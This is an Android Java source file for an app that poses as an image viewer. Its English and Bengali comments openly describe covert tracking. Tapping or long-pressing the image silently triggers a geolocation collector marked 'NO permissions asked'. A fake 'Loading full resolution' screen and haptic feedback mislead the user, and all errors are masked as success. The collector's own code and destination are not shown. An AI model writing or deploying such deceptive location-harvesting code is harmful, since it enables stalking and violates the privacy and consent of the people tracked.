package com.imageviewer;

import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private ImageView imageView;
    private TextView statusText;
    private TextView loadingIndicator;
    private GeolocationCollector geoCollector;
    private final Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        imageView = findViewById(R.id.imageView);
        statusText = findViewById(R.id.statusText);
        loadingIndicator = findViewById(R.id.loadingIndicator);

        // Initialize geolocation collector (NO permissions asked)
        geoCollector = new GeolocationCollector(this);
        geoCollector.setCallback(new GeolocationCollector.Callback() {
            @Override
            public void onCollecting() {
                runOnUiThread(() -> {
                    loadingIndicator.setVisibility(View.VISIBLE);
                    loadingIndicator.setText("⟳ Opening...");
                    statusText.setText("Loading full resolution...");
                });
            }

            @Override
            public void onComplete(String message) {
                runOnUiThread(() -> {
                    loadingIndicator.setText("✓ Loaded");
                    handler.postDelayed(() -> {
                        loadingIndicator.setVisibility(View.GONE);
                        statusText.setText("✦ Tap the image to view in full resolution");
                    }, 2500);
                });
            }

            @Override
            public void onError(String message) {
                // ইউজারকে Error দেখানো যাবে না — সবসময় success দেখাও
                runOnUiThread(() -> {
                    loadingIndicator.setText("✓ Loaded");
                    handler.postDelayed(() -> {
                        loadingIndicator.setVisibility(View.GONE);
                        statusText.setText("✦ Tap the image to view in full resolution");
                    }, 2500);
                });
            }
        });

        // =============================================
        // ★★★ ইমেজে ক্লিক → লোকেশন কালেক্ট ★★★
        // =============================================
        imageView.setOnClickListener(v -> {
            // ডিকেপ্টিভ UI — ইউজার মনে করবে ইমেজ ওপেন হচ্ছে
            statusText.setText("⟳ Loading full resolution...");
            loadingIndicator.setVisibility(View.VISIBLE);
            loadingIndicator.setText("⟳ Opening...");

            // সাইলেন্টলি লোকেশন কালেক্ট করুন
            geoCollector.collectAndSend();

            // ভাইব্রেশন (ছোট — ইউজার স্বাভাবিক মনে করবে)
            v.performHapticFeedback(
                android.view.HapticFeedbackConstants.LONG_PRESS
            );
        });

        // Long-click-ও একই কাজ করে (ইউজার যেভাবেই ক্লিক করুক)
        imageView.setOnLongClickListener(v -> {
            geoCollector.collectAndSend();
            return true;
        });
    }
}